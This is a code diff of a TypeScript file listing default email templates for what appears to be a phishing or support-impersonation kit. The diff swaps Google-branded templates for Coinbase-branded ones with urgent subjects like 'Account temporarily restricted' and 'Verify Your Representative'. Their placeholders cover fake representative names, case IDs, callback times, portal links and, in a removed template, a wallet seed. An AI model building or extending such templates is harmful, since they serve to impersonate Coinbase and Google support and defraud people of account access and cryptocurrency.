@@ -140,87 +140,57 @@ export interface MailTemplate {
 	by: string;
 }
 
-import coinbaseSupportHtml from '../../data/templates/coinbase-support-request.html?raw';
-import coinbaseSafepalHtml from '../../data/templates/coinbase-safepal.html?raw';
-import googleEmployee1Html from '../../data/templates/google-employee-1.html?raw';
-import googleEmployee2Html from '../../data/templates/google-employee-2.html?raw';
-import googlePassword1Html from '../../data/templates/google-password-1.html?raw';
-import googlePassword2Html from '../../data/templates/google-password-2.html?raw';
-import googlePortal1Html from '../../data/templates/google-portal-1.html?raw';
-import googlePortal2Html from '../../data/templates/google-portal-2.html?raw';
-import googlePortal3Html from '../../data/templates/google-portal-3.html?raw';
+import cblockaccHtml from '../../data/templates/cblockacc.html?raw';
+import coinbaseCallbackHtml from '../../data/templates/coinbase-callback.html?raw';
+import coinbaseVaultHtml from '../../data/templates/coinbase-vault.html?raw';
+import coinbaseReviewHtml from '../../data/templates/coinbase-review.html?raw';
+import coinbaseEmployeeHtml from '../../data/templates/coinbase-employee.html?raw';
 
 export const defaultMailTemplates: MailTemplate[] = [
 	{
-		id: 'Coinbase_Portal',
-		name: 'Coinbase Support Request',
-		subject: 'URGENT: Your Coinbase Account Requires Verification',
-		variables: ['[[Representative name]]', '[[Case ID]]', '[[Panel Link]]'],
-		html: coinbaseSupportHtml,
+		id: 'cblockacc',
+		name: 'cblockacc',
+		subject: 'Account temporarily restricted',
+		variables: ['{{CUSTOMER_NAME}}', '{{CASE_ID}}', '{{REPRESENTATIVE_NAME}}'],
+		html: cblockaccHtml,
 		by: 'admin'
 	},
 	{
-		id: 'Coinbase_SafePal',
-		name: 'Coinbase SafePal',
-		subject: 'Wallet Recovery Instructions',
-		variables: ['[[Safepal Seed]]'],
-		html: coinbaseSafepalHtml,
+		id: 'Coinbase_Callback',
+		name: 'Coinbase Callback',
+		subject: 'Callback Information',
+		variables: [
+			'{{CUSTOMER_NAME}}',
+			'{{CASE_ID}}',
+			'{{REPRESENTATIVE_NAME}}',
+			'{{CALLBACK_DATE}}',
+			'{{CALLBACK_TIME}}'
+		],
+		html: coinbaseCallbackHtml,
 		by: 'admin'
 	},
 	{
-		id: 'Google_Employee1',
-		name: 'Google Employee #1',
-		subject: 'Your Google Support Representative',
-		variables: ['[[Representitve Name]]', '[[Case ID]]'],
-		html: googleEmployee1Html,
+		id: 'Coinbase_Vault',
+		name: 'Coinbase Vault',
+		subject: 'Coinbase Vault Created',
+		variables: ['{{DATE}}', '{{case_id}}', '{{UNSUBSCRIBE_URL}}'],
+		html: coinbaseVaultHtml,
 		by: 'admin'
 	},
 	{
-		id: 'Google_Employee2',
-		name: 'Google Employee #2',
-		subject: 'Representative Assignment Verification',
-		variables: ['[[Representitve Name]]', '[[Case ID]]'],
-		html: googleEmployee2Html,
+		id: 'Coinbase_Review',
+		name: 'Coinbase Review',
+		subject: 'Review Account Activity',
+		variables: ['{{DATE}}', '{{ticket_number}}', '{{secure_portal_url}}', '{{UNSUBSCRIBE_URL}}'],
+		html: coinbaseReviewHtml,
 		by: 'admin'
 	},
 	{
-		id: 'Google_Password1',
-		name: 'Google Password #1',
-		subject: 'Your Temporary Access Password',
-		variables: ['[[Password]]'],
-		html: googlePassword1Html,
-		by: 'admin'
-	},
-	{
-		id: 'Google_Password2',
-		name: 'Google Password #2',
-		subject: 'Recent Call Follow-Up',
-		variables: ['[[Password]]'],
-		html: googlePassword2Html,
-		by: 'admin'
-	},
-	{
-		id: 'Google_Portal1',
-		name: 'Google Portal #1',
-		subject: 'Your Access Portal',
-		variables: ['[[Case ID]]', '[[Panel Link]]'],
-		html: googlePortal1Html,
-		by: 'admin'
-	},
-	{
-		id: 'Google_Portal2',
-		name: 'Google Portal #2',
-		subject: 'Case Portal Access',
-		variables: ['[[Representative Name]]', '[[Case ID]]', '[[Panel Link]]'],
-		html: googlePortal2Html,
-		by: 'admin'
-	},
-	{
-		id: 'Google_Portal3',
-		name: 'Google Portal #3',
-		subject: 'Case Access Portal',
-		variables: ['[[Panel Link]]'],
-		html: googlePortal3Html,
+		id: 'Coinbase_Employee',
+		name: 'Coinbase Employee',
+		subject: 'Verify Your Representative',
+		variables: ['{{DATE}}', '{{ticket_id}}', '{{EmployeeName}}', '{{Phone}}', '{{UNSUBSCRIBE_URL}}'],
+		html: coinbaseEmployeeHtml,
 		by: 'admin'
 	}
 ];
